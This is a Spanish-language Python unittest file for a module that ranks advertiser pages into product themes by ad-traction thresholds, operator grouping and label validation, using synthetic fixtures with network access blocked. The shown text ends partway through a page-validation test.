"""Pruebas de scripts/modelado/barrido/ranking.py (B5: temas, tracción, matriz tema × país, exportadores, puente).

Sin red (se bloquea `socket.socket`) y sin tocar `empresa/` real (toda escritura va a una raíz temporal).
Los datos son sintéticos: tests/fixtures/barrido/ranking/ (ver gen en el propio JSON). Los umbrales salen del archivo
real `scripts/modelado/parametros_modelado.propuesta.yaml` (solo lectura): 15 anuncios y 10 días.
Las fichas se validan SIEMPRE con `puntaje_modelar.validar_fichas` real; los canarios de puertas/transferibilidad
fallan si alguien reintroduce las reglas retiradas por el dueño (2026-11-06).
"""

from __future__ import annotations

import copy
import json
import random
import tempfile
import unittest
from datetime import datetime, timezone
from decimal import Decimal
from pathlib import Path
from unittest import mock

from scripts.modelado import puntaje_modelar as pm
from scripts.modelado.barrido import comun, ranking

RAIZ = Path(__file__).resolve().parents[2]
FIX = Path(__file__).resolve().parents[1] / "fixtures" / "barrido" / "ranking"
PROPUESTA = RAIZ / "scripts" / "modelado" / "parametros_modelado.propuesta.yaml"
PROPUESTA_BARRIDO = RAIZ / "scripts" / "modelado" / "barrido" / "parametros_barrido.propuesta.yaml"
AHORA = datetime(2026, 11, 6, 7, 0, 0, tzinfo=timezone.utc)

# Vocabulario VIGENTE de Modo D (fórmula pm-2). Si alguien reintroduce las puertas o el componente retirados,
# los canarios de abajo fallan.
PUERTAS_VIGENTES = ("marca_personal", "sustituto_gratis_cubre", "practica_vetada")
TRANSFERIBILIDAD_VIGENTE = ("dolor_universal", "viabilidad_ticket", "riesgo_politicas")
RETIRADAS = ("commodity_facil_de_modelar", "requiere_comunidad_o_vivo_o_app", "producibilidad")


def cargar(nombre: str):
    return json.loads((FIX / nombre).read_text(encoding="utf-8"))


def pid(n: int) -> str:
    return str(1000000000000000 + n)


def pg(n, *, paises=("US",), anuncios=20, edad="12", conceptos=3, titulos=None, trunc=False, nombre=None,
       exportador="default"):
    """Página de B2 mínima y válida."""
    if titulos is None:
        titulos = [f"Título {n} número {i}" for i in range(conceptos)]
    bloque = ({"señal": False, "moneda": "USD", "pais_anuncio": list(paises)[0], "motivo": "sin indicio"}
              if exportador == "default" else exportador)
    pagina = {"page_id": pid(n), "page_name": nombre if nombre is not None else f"Página {n}",
              "paises": list(paises), "monedas": ["USD"], "anuncios_activos_en_muestra": anuncios,
              "edad_oferta_dias": edad, "edad_max_dias": edad, "conceptos_unicos": conceptos,
              "titulos": list(titulos), "qids": ["q"], "muestra_truncada": trunc}
    if bloque is not None:
        pagina["exportador"] = bloque
    return pagina


def med(n, estado, medidos, edad, *, edad_piso=None, medidos_piso=None, paises=("ES",), por_pais=None, anuncios=None,
        conceptos=2, **kw):
    """Página de B2 con la medición de la pasada 3 (`medicion`, `anuncios_activos_medidos`, `edad_es_piso`)."""
    anuncios = anuncios if anuncios is not None else max(conceptos, min(medidos, 50))
    pagina = pg(n, paises=paises, anuncios=anuncios, edad=edad, conceptos=conceptos, trunc=estado != "completa", **kw)
    pagina["medicion"] = {"estado": estado, "por_pais": por_pais if por_pais is not None else {}}
    pagina["anuncios_activos_medidos"] = medidos
    pagina["anuncios_activos_medidos_es_piso"] = estado != "completa" if medidos_piso is None else medidos_piso
    pagina["edad_es_piso"] = estado != "completa" if edad_piso is None else edad_piso
    return pagina


def por_pais(**paises):
    """{PAIS: (fuente, vistos, total, completa)} → bloque `medicion.por_pais`."""
    return {p: {"fuente": f, "anuncios_vistos": v, "total_declarado": tot, "completa": c}
            for p, (f, v, tot, c) in paises.items()}


def et(n, slug="tema-a", *, formato="guia_pdf", macro=None, es_oferta=True, tema=None, publico="gente"):
    """Etiqueta consolidada de B4 mínima y válida."""
    return {"page_id": pid(n), "tema": tema or slug.replace("-", " "), "tema_slug": slug, "publico": publico,
            "formato": formato, "macro_nicho": macro, "macro_nicho_motivo": "t", "es_oferta_digital_pago_unico": es_oferta,
            "confianza": "0.9", "evidencia": [{"titulo": "x"}]}


def docs(paginas, etiquetas, corrida="2026-11-06-a"):
    return ({"schema_version": "1.0.0", "corrida_id": corrida, "generado_en": "2026-11-06T06:00:00Z",
             "paginas": paginas, "advertencias": []},
            {"schema_version": "1.0.0", "corrida_id": corrida, "lote_id": "t", "etiquetador": "t",
             "paginas": etiquetas})


class Base(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.p = comun.cargar_parametros_modelado(PROPUESTA)
        cls.pb = cargar("par_barrido.json")

    def setUp(self):
        parche = mock.patch("socket.socket", side_effect=AssertionError("las pruebas no usan red"))
        parche.start()
        self.addCleanup(parche.stop)

    def rank(self, paginas, etiquetas, **kw):
        pd, ed = docs(paginas, etiquetas)
        kw.setdefault("par_modelado", self.p)
        kw.setdefault("par_barrido", self.pb)
        kw.setdefault("ahora", AHORA)
        return ranking.rankear(pd, ed, **kw)

    def rank_fix(self, **kw):
        kw.setdefault("par_modelado", self.p)
        kw.setdefault("par_barrido", self.pb)
        kw.setdefault("ahora", AHORA)
        return ranking.rankear(cargar("paginas.json"), cargar("etiquetas.json"), **kw)

    @staticmethod
    def tema(doc, slug):
        return next(t for t in doc["temas"] if t["tema_slug"] == slug)

    @staticmethod
    def pagina(doc, n):
        for t in doc["temas"]:
            for p in t["paginas"]:
                if p["page_id"] == pid(n):
                    return p
        raise AssertionError(f"la página {n} no está en ningún tema")

    def uno(self, **kw):
        """Tema con una sola página (tema-a) según los kwargs de `pg`."""
        doc = self.rank([pg(1, **kw)], [et(1)])
        return doc, doc["temas"][0], doc["temas"][0]["paginas"][0]


# ---------------------------------------------------------------------------
# Tracción: umbrales, bordes, muestra truncada
# ---------------------------------------------------------------------------

class PruebaUmbralesDeTraccion(Base):
    def test_los_umbrales_reales_son_15_anuncios_y_10_dias(self):
        self.assertEqual(self.p["modelado_anuncios_objetivo"], 15)
        self.assertEqual(self.p["modelado_dias_objetivo"], Decimal(10))

    def test_borde_exacto_15_anuncios_y_10_dias_pasa(self):
        _, tema, pagina = self.uno(anuncios=15, edad="10", conceptos=2)
        self.assertEqual(pagina["estado_traccion"], "pasa")
        self.assertIs(pagina["pasa_traccion"], True)
        self.assertIs(tema["pasa_traccion"], True)
        self.assertEqual(pagina["traccion_detalle"], {"anuncios": "cumple", "edad": "cumple"})

    def test_14_anuncios_no_pasa(self):
        _, tema, pagina = self.uno(anuncios=14, edad="10", conceptos=2)
        self.assertEqual(pagina["estado_traccion"], "no_pasa")
        self.assertIs(pagina["pasa_traccion"], False)
        self.assertEqual(pagina["traccion_detalle"]["anuncios"], "no_cumple")
        self.assertEqual(tema["estado_traccion"], "no_pasa")

    def test_edad_9_99_no_pasa(self):
        _, _, pagina = self.uno(anuncios=15, edad="9.99", conceptos=2)
        self.assertEqual(pagina["estado_traccion"], "no_pasa")
        self.assertEqual(pagina["traccion_detalle"], {"anuncios": "cumple", "edad": "no_cumple"})

    def test_edad_10_01_y_16_anuncios_pasa(self):
        _, _, pagina = self.uno(anuncios=16, edad="10.01", conceptos=2)
        self.assertEqual(pagina["estado_traccion"], "pasa")

    def test_ambos_criterios_bajo_el_umbral_no_pasa(self):
        _, _, pagina = self.uno(anuncios=3, edad="0", conceptos=1)
        self.assertEqual(pagina["estado_traccion"], "no_pasa")

    def test_el_umbral_sale_de_los_parametros_no_del_codigo(self):
        mas_exigente = dict(self.p, modelado_anuncios_objetivo=20)
        doc = self.rank([pg(1, anuncios=16, edad="12", conceptos=2)], [et(1)], par_modelado=mas_exigente)
        self.assertEqual(doc["temas"][0]["estado_traccion"], "no_pasa")
        self.assertEqual(doc["umbrales_traccion"]["anuncios_activos"], 20)
        mas_laxo = dict(self.p, modelado_anuncios_objetivo=5, modelado_dias_objetivo=Decimal("1.5"))
        doc = self.rank([pg(1, anuncios=5, edad="1.5", conceptos=2)], [et(1)], par_modelado=mas_laxo)
        self.assertEqual(doc["temas"][0]["estado_traccion"], "pasa")
        self.assertEqual(doc["umbrales_traccion"]["edad_oferta_dias"], "1.5")

    def test_falla_cerrado_si_falta_un_umbral(self):
        for clave in ("modelado_anuncios_objetivo", "modelado_dias_objetivo"):
            with self.subTest(clave=clave):
                par = {k: v for k, v in self.p.items() if k != clave}
                with self.assertRaises(pm.ErrorLimite) as ctx:
                    self.rank([pg(1)], [et(1)], par_modelado=par)
                self.assertEqual(ctx.exception.codigo_salida, 5)
                self.assertIn(clave, str(ctx.exception))
                with self.assertRaises(pm.ErrorLimite):
                    self.rank([pg(1)], [et(1)], par_modelado={**self.p, clave: None})

    def test_umbral_con_tipo_raro_es_error_de_validacion(self):
        for valor in (True, 15.5, "quince"):
            with self.subTest(valor=valor), self.assertRaises(pm.ErrorValidacion):
                self.rank([pg(1)], [et(1)], par_modelado=dict(self.p, modelado_anuncios_objetivo=valor))
        with self.assertRaises(pm.ErrorValidacion):
            self.rank([pg(1)], [et(1)], par_modelado=dict(self.p, modelado_dias_objetivo=Decimal(0)))
        with self.assertRaises(pm.ErrorValidacion):
            self.rank([pg(1)], [et(1)], par_modelado=dict(self.p, modelado_dias_objetivo=1.5))

    def test_par_modelado_no_mapa_es_error_de_uso(self):
        with self.assertRaises(pm.ErrorUso):
            self.rank([pg(1)], [et(1)], par_modelado=None)


class PruebaMuestraTruncada(Base):
    def test_piso_que_ya_supera_el_umbral_pasa(self):
        _, tema, pagina = self.uno(anuncios=15, edad="10", conceptos=2, trunc=True)
        self.assertEqual(pagina["estado_traccion"], "pasa")
        self.assertTrue(pagina["muestra_truncada"])
        self.assertTrue(tema["hay_muestra_truncada"])
        _, _, pagina = self.uno(anuncios=50, edad="40", conceptos=3, trunc=True)
        self.assertEqual(pagina["estado_traccion"], "pasa")

    def test_piso_que_no_supera_el_umbral_queda_indeterminada(self):
        _, tema, pagina = self.uno(anuncios=3, edad="1", conceptos=2, trunc=True)
        self.assertEqual(pagina["estado_traccion"], "indeterminada_por_muestra")
        self.assertIsNone(pagina["pasa_traccion"])
        self.assertEqual(tema["estado_traccion"], "indeterminada_por_muestra")
        self.assertIsNone(tema["pasa_traccion"])

    def test_anuncios_bien_pero_edad_baja_en_muestra_truncada_es_indeterminada(self):
        _, _, pagina = self.uno(anuncios=20, edad="4", conceptos=2, trunc=True)
        self.assertEqual(pagina["estado_traccion"], "indeterminada_por_muestra")
        self.assertEqual(pagina["traccion_detalle"], {"anuncios": "cumple", "edad": "indeterminada"})

    def test_nunca_se_descarta_por_un_conteo_truncado(self):
        for anuncios in (1, 2, 5, 14, 15, 40, 50):
            for edad in ("0", "3", "9.99", "10", "30"):
                with self.subTest(anuncios=anuncios, edad=edad):
                    _, _, pagina = self.uno(anuncios=anuncios, edad=edad, conceptos=1, trunc=True)
                    self.assertNotEqual(pagina["estado_traccion"], "no_pasa")

    def test_sin_truncar_el_mismo_conteo_si_descarta(self):
        _, _, pagina = self.uno(anuncios=3, edad="1", conceptos=2, trunc=False)
        self.assertEqual(pagina["estado_traccion"], "no_pasa")

    def test_un_criterio_definitivamente_malo_no_se_salva_por_truncada_en_el_otro(self):
        # no hay tal caso con una página (la bandera es de la página); verifica que ambos criterios usan la bandera
        _, _, pagina = self.uno(anuncios=14, edad="30", conceptos=2, trunc=True)
        self.assertEqual(pagina["traccion_detalle"], {"anuncios": "indeterminada", "edad": "cumple"})
        self.assertEqual(pagina["estado_traccion"], "indeterminada_por_muestra")

    def test_indeterminada_no_genera_ficha_pero_el_tema_se_rankea_antes_que_no_pasa(self):
        doc = self.rank_fix()
        slugs = [t["tema_slug"] for t in doc["temas"]]
        self.assertLess(slugs.index("yoga-posturas"), slugs.index("plantillas-boda"))
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        self.assertNotIn(pid(21), json.dumps(fichas))

    def test_advertencia_menciona_las_paginas_truncadas(self):
        doc = self.rank_fix()
        self.assertTrue(any("truncada" in a and "PISO" in a for a in doc["advertencias"]))


class PruebaTemaYEdad(Base):
    def test_el_tema_pasa_si_alguna_pagina_pasa(self):
        doc = self.rank([pg(1, anuncios=20, edad="12"), pg(2, anuncios=4, edad="1")], [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["estado_traccion"], "pasa")
        self.assertEqual(doc["temas"][0]["paginas_con_traccion"], 1)

    def test_edad_del_tema_es_la_mayor_entre_paginas_con_traccion(self):
        doc = self.rank([pg(1, anuncios=20, edad="12"), pg(2, anuncios=16, edad="25.5"),
                         pg(3, anuncios=4, edad="90")],  # la de 90 días no tiene tracción: no cuenta
                        [et(1), et(2), et(3)])
        tema = doc["temas"][0]
        self.assertEqual(tema["edad_oferta_dias"], "25.5")
        self.assertEqual(tema["edad_max_muestra_dias"], "90")

    def test_edad_del_tema_es_null_si_ninguna_pagina_tiene_traccion(self):
        _, tema, _ = self.uno(anuncios=3, edad="2", conceptos=1)
        self.assertIsNone(tema["edad_oferta_dias"])
        self.assertEqual(tema["edad_max_muestra_dias"], "2")

    def test_la_edad_es_la_de_la_pagina_sin_recalcular(self):
        _, _, pagina = self.uno(anuncios=20, edad="14.90", conceptos=2)
        self.assertEqual(pagina["edad_oferta_dias"], "14.90")

    def test_orden_de_los_temas_del_fixture(self):
        doc = self.rank_fix()
        self.assertEqual([t["tema_slug"] for t in doc["temas"]],
                         ["crochet-patrones", "finanzas-freelance", "atlas-puntos-gatillo", "tema-dudoso",
                          "recetas-diabeticos", "yoga-posturas", "plantillas-boda"])
        self.assertEqual([t["rank"] for t in doc["temas"]], [1, 2, 3, 4, 5, 6, 7])
        self.assertEqual([t["estado_traccion"] for t in doc["temas"]],
                         ["pasa"] * 5 + ["indeterminada_por_muestra", "no_pasa"])

    def test_desempate_por_edad_anuncios_y_slug(self):
        base = [pg(1, anuncios=20, edad="12"), pg(2, anuncios=20, edad="12")]
        doc = self.rank(base, [et(1, "tema-b"), et(2, "tema-a")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-a", "tema-b"])  # empate total: por slug
        doc = self.rank([pg(1, anuncios=20, edad="12"), pg(2, anuncios=20, edad="15")], [et(1, "tema-a"), et(2, "tema-b")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-b", "tema-a"])  # más edad primero
        doc = self.rank([pg(1, anuncios=20, edad="12"), pg(2, anuncios=30, edad="12")], [et(1, "tema-a"), et(2, "tema-b")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-b", "tema-a"])  # más anuncios primero

    def test_mas_anunciantes_independientes_gana_aunque_tenga_menos_edad(self):
        doc = self.rank([pg(1, edad="40"), pg(2, edad="11"), pg(3, edad="11")],
                        [et(1, "tema-a"), et(2, "tema-b"), et(3, "tema-b")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-b", "tema-a"])

    def test_tema_con_una_sola_pagina(self):
        doc, tema, pagina = self.uno(anuncios=20, edad="12")
        self.assertEqual(tema["anunciantes_independientes"], 1)
        self.assertEqual(tema["paginas_total"], 1)
        self.assertFalse(pagina["posible_mismo_operador"])
        self.assertTrue(pagina["cuenta_como_independiente"])

    def test_resumen_y_conteos_del_fixture(self):
        doc = self.rank_fix()
        r = doc["resumen"]
        self.assertEqual((r["paginas_total"], r["paginas_candidatas"], r["paginas_en_temas"], r["paginas_sin_tema"],
                          r["paginas_descartadas"]), (23, 16, 13, 3, 7))
        self.assertEqual(r["paginas_en_temas"] + r["paginas_sin_tema"] + r["paginas_descartadas"], r["paginas_total"])
        self.assertEqual((r["temas"], r["temas_pasan_traccion"], r["temas_indeterminados_por_muestra"],
                          r["temas_no_pasan_traccion"]), (7, 5, 1, 1))
        self.assertEqual((r["sin_tema_pasan_traccion"], r["sin_tema_indeterminadas_por_muestra"],
                          r["paginas_por_verificar"]), (2, 1, 4))  # 64 (tema-dudoso) + 68, 70 y 71 (sin_tema)
        self.assertEqual(r["temas_que_pasan_por_macro_nicho"],
                         {"salud": 2, "relaciones": 0, "dinero": 0, "mixto": 1, "fuera_de_marco": 2})

    def test_suma_de_anuncios_y_paises_del_tema(self):
        atlas = self.tema(self.rank_fix(), "atlas-puntos-gatillo")
        self.assertEqual(atlas["anuncios_activos_en_muestra"], 27 + 16 + 15)
        self.assertEqual(atlas["paises"], ["ES", "US"])
        self.assertEqual(atlas["formatos"], {"atlas_mapas": 3})
        self.assertEqual(atlas["publicos"], ["fisioterapeutas"])
        self.assertEqual(atlas["tema"], "Atlas de puntos gatillo")  # moda del texto libre (2 de 3)


# ---------------------------------------------------------------------------
# Anunciantes independientes y «posible mismo operador»
# ---------------------------------------------------------------------------

class PruebaAnunciantesIndependientes(Base):
    def test_paginas_con_los_mismos_titulos_son_un_solo_anunciante(self):
        doc = self.rank_fix()
        atlas = self.tema(doc, "atlas-puntos-gatillo")
        self.assertEqual(atlas["paginas_total"], 3)
        self.assertEqual(atlas["anunciantes_independientes"], 2)
        self.assertEqual(atlas["paginas_posible_mismo_operador"], 2)
        a, b, c = (self.pagina(doc, n) for n in (1, 2, 3))
        self.assertFalse(a["posible_mismo_operador"])
        self.assertTrue(b["posible_mismo_operador"] and c["posible_mismo_operador"])
        self.assertEqual(b["grupo_operador"], c["grupo_operador"])
        self.assertEqual(b["paginas_en_grupo"], 2)
        self.assertEqual([b["cuenta_como_independiente"], c["cuenta_como_independiente"]].count(True), 1)

    def test_la_comparacion_normaliza_mayusculas_y_espacios(self):
        doc = self.rank([pg(1, titulos=["Guía  Completa", "Otro"]), pg(2, titulos=["otro", "guía completa"])],
                        [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["anunciantes_independientes"], 1)

    def test_un_titulo_distinto_los_separa(self):
        doc = self.rank([pg(1, titulos=["A", "B"]), pg(2, titulos=["A", "B", "C"])], [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["anunciantes_independientes"], 2)
        self.assertFalse(self.pagina(doc, 1)["posible_mismo_operador"])

    def test_un_subconjunto_de_titulos_no_es_el_mismo_operador(self):
        doc = self.rank([pg(1, titulos=["A", "B"]), pg(2, titulos=["A"])], [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["anunciantes_independientes"], 2)

    def test_titulos_vacios_o_sin_titulo_nunca_agrupan(self):
        for titulos in ([""], ["(sin título)"], [], ["", "(sin título)"]):
            with self.subTest(titulos=titulos):
                doc = self.rank([pg(1, titulos=titulos, conceptos=1), pg(2, titulos=titulos, conceptos=1)],
                                [et(1), et(2)])
                self.assertEqual(doc["temas"][0]["anunciantes_independientes"], 2)
                self.assertFalse(self.pagina(doc, 1)["posible_mismo_operador"])

    def test_tres_paginas_clon_son_un_anunciante(self):
        doc = self.rank([pg(n, titulos=["X", "Y"]) for n in (1, 2, 3)], [et(n) for n in (1, 2, 3)])
        tema = doc["temas"][0]
        self.assertEqual(tema["anunciantes_independientes"], 1)
        self.assertEqual(tema["paginas_posible_mismo_operador"], 3)
        self.assertEqual({self.pagina(doc, n)["paginas_en_grupo"] for n in (1, 2, 3)}, {3})

    def test_los_clones_de_temas_distintos_no_se_agrupan_entre_si(self):
        doc = self.rank([pg(1, titulos=["X", "Y"]), pg(2, titulos=["X", "Y"])], [et(1, "tema-a"), et(2, "tema-b")])
        self.assertEqual([t["anunciantes_independientes"] for t in doc["temas"]], [1, 1])
        self.assertFalse(self.pagina(doc, 1)["posible_mismo_operador"])

    def test_el_representante_del_grupo_es_el_que_pasa_la_traccion(self):
        # misma firma de títulos; la 2 tiene menos anuncios pero es la única que pasa (la 1 no llega a 10 días)
        doc = self.rank([pg(1, anuncios=40, edad="3", titulos=["X", "Y"], conceptos=2),
                         pg(2, anuncios=16, edad="12", titulos=["X", "Y"], conceptos=2),
                         pg(3, paises=["ES"], anuncios=2, edad="1", conceptos=1)],  # otro tema, para que haya un hueco
                        [et(1), et(2), et(3, "tema-b")])
        self.assertFalse(self.pagina(doc, 1)["cuenta_como_independiente"])
        self.assertTrue(self.pagina(doc, 2)["cuenta_como_independiente"])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(len(fichas["ofertas"]), 1)
        self.assertTrue(fichas["ofertas"][0]["modelo_id"].endswith(pid(2)))

    def test_los_descartados_no_cuentan_como_anunciantes(self):
        doc = self.rank_fix()
        finanzas = self.tema(doc, "finanzas-freelance")
        self.assertEqual(finanzas["paginas_total"], 2)  # la consultoría (servicio) quedó fuera
        self.assertEqual(finanzas["anunciantes_independientes"], 2)


# ---------------------------------------------------------------------------
# Clasificación: descartes con motivo, etiquetas ausentes o malas, una página = un tema
# ---------------------------------------------------------------------------

class PruebaDescartesYEtiquetas(Base):
    def motivos(self, doc):
        return {d["page_id"]: d["motivos"] for d in doc["descartadas"]}

    def test_descartadas_del_fixture_con_su_motivo(self):
        m = self.motivos(self.rank_fix())
        self.assertEqual(m[pid(61)], ["no_es_oferta_digital_pago_unico", "formato_excluido:comunidad_o_app"])
        self.assertEqual(m[pid(62)], ["formato_excluido:servicio"])
        self.assertEqual(m[pid(63)], ["formato_excluido:producto_fisico"])
        self.assertNotIn(pid(64), m)  # es_oferta null AVANZA (por verificar)
        self.assertEqual(m[pid(65)], ["sin_etiqueta"])
        self.assertTrue(m[pid(66)][0].startswith("etiqueta_invalida:"))
        self.assertTrue(m[pid(67)][0].startswith("etiqueta_conflictiva:"))
        self.assertEqual(m[pid(69)], ["tema_indeterminado_sin_traccion_alta"])
        self.assertEqual(len(m), 7)

    def test_cada_formato_excluido_descarta_aunque_es_oferta_sea_true_o_null(self):
        for formato in ("comunidad_o_app", "servicio", "producto_fisico"):
            for es_oferta in (True, None):
                with self.subTest(formato=formato, es_oferta=es_oferta):
                    doc = self.rank([pg(1)], [et(1, formato=formato, es_oferta=es_oferta)])
                    self.assertEqual((doc["temas"], doc["sin_tema"]), ([], []))
                    self.assertEqual(self.motivos(doc)[pid(1)], [f"formato_excluido:{formato}"])

    def test_es_oferta_false_no_avanza_y_queda_registrada(self):
        doc = self.rank([pg(1)], [et(1, es_oferta=False)])
        self.assertEqual(doc["temas"], [])
        self.assertEqual(self.motivos(doc)[pid(1)], ["no_es_oferta_digital_pago_unico"])

    def test_false_con_formato_excluido_registra_los_dos_motivos(self):
        doc = self.rank([pg(1)], [et(1, formato="servicio", es_oferta=False)])
        self.assertEqual(self.motivos(doc)[pid(1)], ["no_es_oferta_digital_pago_unico", "formato_excluido:servicio"])

    def test_todos_los_demas_formatos_avanzan(self):
        for formato in ranking.FORMATOS:
            if formato in ranking.FORMATOS_EXCLUIDOS:
                continue
            with self.subTest(formato=formato):
                doc = self.rank([pg(1)], [et(1, formato=formato)])
                self.assertEqual(len(doc["temas"]), 1)

    def test_lo_descartado_queda_registrado_para_auditoria(self):
        d = next(x for x in self.rank_fix()["descartadas"] if x["page_id"] == pid(61))
        self.assertEqual(d["page_name"], "Comunidad Yoga VIP")
        self.assertEqual(d["paises"], ["ES"])
        self.assertEqual(d["tema_slug"], "yoga-posturas")
        self.assertEqual(d["formato"], "comunidad_o_app")
        self.assertEqual(d["anuncios_activos_en_muestra"], 40)
        self.assertIs(d["es_oferta_digital_pago_unico"], False)

    def test_el_macro_nicho_nunca_descarta(self):
        for macro in ("salud", "relaciones", "dinero", None):
            with self.subTest(macro=macro):
                doc = self.rank([pg(1)], [et(1, macro=macro)])
                self.assertEqual(len(doc["temas"]), 1)
                self.assertEqual(doc["descartadas"], [])

    def test_una_pagina_vive_en_un_solo_tema(self):
        doc = self.rank_fix()
        ids = [p["page_id"] for t in doc["temas"] for p in t["paginas"]]
        sin_tema = [p["page_id"] for p in doc["sin_tema"]]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertNotIn(pid(67), ids + sin_tema)  # etiquetada en dos temas distintos: ninguno la reclama
        descartadas = [d["page_id"] for d in doc["descartadas"]]
        self.assertFalse(set(ids) & set(descartadas))
        self.assertFalse(set(ids + sin_tema) & set(descartadas))
        self.assertFalse(set(ids) & set(sin_tema))
        self.assertEqual(len(ids) + len(sin_tema) + len(descartadas), doc["resumen"]["paginas_total"])

    def test_misma_pagina_en_dos_temas_queda_conflictiva_con_ambos_slugs(self):
        doc = self.rank([pg(1)], [et(1, "tema-a"), et(1, "tema-b")])
        self.assertEqual(doc["temas"], [])
        self.assertEqual(self.motivos(doc)[pid(1)], ["etiqueta_conflictiva: tema-a, tema-b"])

    def test_etiqueta_repetida_e_identica_no_es_conflicto(self):
        doc = self.rank([pg(1)], [et(1, "tema-a"), et(1, "tema-a", tema="Otro texto")])
        self.assertEqual(len(doc["temas"]), 1)
        self.assertEqual(doc["descartadas"], [])

    def test_misma_etiqueta_con_otro_formato_es_conflicto(self):
        doc = self.rank([pg(1)], [et(1, "tema-a", formato="ebook"), et(1, "tema-a", formato="guia_pdf")])
        self.assertTrue(self.motivos(doc)[pid(1)][0].startswith("etiqueta_conflictiva"))

    def test_etiqueta_ausente_deja_la_pagina_sin_tema(self):
        doc = self.rank([pg(1), pg(2)], [et(1)])
        self.assertEqual(self.motivos(doc), {pid(2): ["sin_etiqueta"]})
        self.assertEqual([p["page_id"] for p in doc["temas"][0]["paginas"]], [pid(1)])

    def test_sin_ninguna_etiqueta_no_hay_temas(self):
        doc = self.rank([pg(1), pg(2)], [])
        self.assertEqual(doc["temas"], [])
        self.assertEqual(doc["resumen"]["paginas_descartadas"], 2)
        self.assertEqual(doc["resumen"]["temas"], 0)

    def test_etiquetas_invalidas_se_registran_sin_tumbar_el_ranking(self):
        malas = [
            ("falta tema_slug", lambda e: e.pop("tema_slug")),
            ("slug no kebab", lambda e: e.update(tema_slug="Tema Con Espacios")),
            ("slug con tilde", lambda e: e.update(tema_slug="año-nuevo")),
            ("formato desconocido", lambda e: e.update(formato="video_largo")),
            ("macro desconocido", lambda e: e.update(macro_nicho="cripto")),
            ("es_oferta texto", lambda e: e.update(es_oferta_digital_pago_unico="si")),
            ("falta es_oferta", lambda e: e.pop("es_oferta_digital_pago_unico")),
            ("falta macro", lambda e: e.pop("macro_nicho")),
        ]
        for nombre, rompe in malas:
            with self.subTest(nombre):
                e = et(1)
                rompe(e)
                doc = self.rank([pg(1), pg(2)], [e, et(2)])
                self.assertTrue(self.motivos(doc)[pid(1)][0].startswith("etiqueta_invalida:"), self.motivos(doc))
                self.assertEqual(len(doc["temas"]), 1)  # la 2 sigue su camino

    def test_etiqueta_huerfana_se_ignora_con_advertencia(self):
        doc = self.rank_fix()
        self.assertTrue(any("ignoraron" in a and str(pid(9999)) in a for a in doc["advertencias"]))
        self.assertNotIn("tema-huerfano", json.dumps(doc))

    def test_etiqueta_sin_page_id_utilizable_se_ignora_con_advertencia(self):
        e = et(1)
        e["page_id"] = "no-es-un-id"
        doc = self.rank([pg(1)], [e, "basura"])
        self.assertEqual(self.motivos(doc), {pid(1): ["sin_etiqueta"]})
        self.assertTrue(any("sin page_id" in a for a in doc["advertencias"]))

    def test_lee_el_consolidado_de_b4_con_disputas_y_sin_etiquetar(self):
        doc = ranking.rankear(cargar("paginas.json"), cargar("etiquetas_consolidado.json"), par_modelado=self.p,
                              par_barrido=self.pb, ahora=AHORA)
        m = self.motivos(doc)
        self.assertEqual(m[pid(65)], ["sin_etiqueta: lote_sin_salida"])
        self.assertEqual(m[pid(66)], ["sin_etiqueta: etiqueta_rechazada"])
        self.assertEqual(m[pid(67)], ["etiqueta_en_disputa: formato"])
        self.assertNotIn(pid(64), m)  # null avanza
        self.assertEqual(m[pid(69)], ["tema_indeterminado_sin_traccion_alta"])
        # los temas son los mismos que con las etiquetas de lote: lo extra del consolidado se ignora
        base = self.rank_fix()
        self.assertEqual(json.dumps(doc["temas"], ensure_ascii=False), json.dumps(base["temas"], ensure_ascii=False))
        self.assertEqual(json.dumps(doc["sin_tema"], ensure_ascii=False), json.dumps(base["sin_tema"], ensure_ascii=False))
        self.assertEqual(doc["resumen"]["descartadas_por_motivo"]["sin_etiqueta"], 2)
        self.assertEqual(doc["resumen"]["descartadas_por_motivo"]["etiqueta_en_disputa"], 1)

    def test_la_regla_de_avance_coincide_con_la_de_etiquetado(self):
        from scripts.modelado.barrido import etiquetado
        self.assertEqual(ranking.TEMA_INDETERMINADO, etiquetado.TEMA_INDETERMINADO)
        self.assertEqual(ranking.FORMATOS, etiquetado.FORMATOS)
        self.assertEqual(ranking.FORMATOS_EXCLUIDOS, etiquetado.FORMATOS_NO_CANDIDATOS)
        for formato in ranking.FORMATOS:
            for es_oferta in (True, False, None):
                with self.subTest(formato=formato, es_oferta=es_oferta):
                    etiqueta = {"es_oferta_digital_pago_unico": es_oferta, "formato": formato}
                    doc = self.rank([pg(1)], [et(1, formato=formato, es_oferta=es_oferta)])
                    self.assertEqual(len(doc["temas"]) == 1, etiquetado.avanza_a_candidata(etiqueta))

    def test_etiquetas_pueden_venir_como_lista_o_bajo_la_clave_etiquetas(self):
        pd, ed = docs([pg(1)], [et(1)])
        for forma in (ed["paginas"], {"etiquetas": ed["paginas"]}):
            with self.subTest(tipo=type(forma).__name__):
                doc = ranking.rankear(pd, forma, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)
                self.assertEqual(len(doc["temas"]), 1)

    def test_etiquetas_de_otra_corrida_son_error(self):
        pd, ed = docs([pg(1)], [et(1)])
        ed["corrida_id"] = "2026-11-05-a"
        with self.assertRaises(pm.ErrorValidacion):
            ranking.rankear(pd, ed, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)

    def test_etiquetas_con_forma_rara_son_error(self):
        pd, _ = docs([pg(1)], [])
        for malo in (None, "texto", 5, {"paginas": "no"}, {"sin_clave": []}):
            with self.subTest(malo=malo), self.assertRaises(pm.ErrorValidacion):
                ranking.rankear(pd, malo, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)


class PruebaValidacionDePaginas(Base):
    def test_cada_campo_obligatorio_faltante_es_error(self):
        for campo in ("page_id", "paises", "anuncios_activos_en_muestra", "edad_oferta_dias", "conceptos_unicos",
                      "muestra_truncada"):
            with self.subTest(campo=campo):
                p = pg(1)
                del p[campo]
